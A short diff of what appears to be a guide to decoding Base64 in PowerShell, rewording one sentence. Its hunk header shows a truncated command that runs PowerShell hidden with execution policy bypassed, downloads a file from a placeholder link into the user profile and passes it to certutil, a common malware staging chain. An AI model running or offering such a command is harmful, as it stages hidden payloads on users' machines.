@@ -45,7 +45,7 @@ powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -
 
 - You can decode Base64 directly in PowerShell. Using `Convert.FromBase64String()` you can decode the content from Base64 to binary. You would then use `[Text.Encoding]::UTF8.GetString()` to convert the binary data to a regular string.
 
-For example, the below code converts Base64 to binary:
+For example:
 
 ```powershell
 # convert base64 string to binary
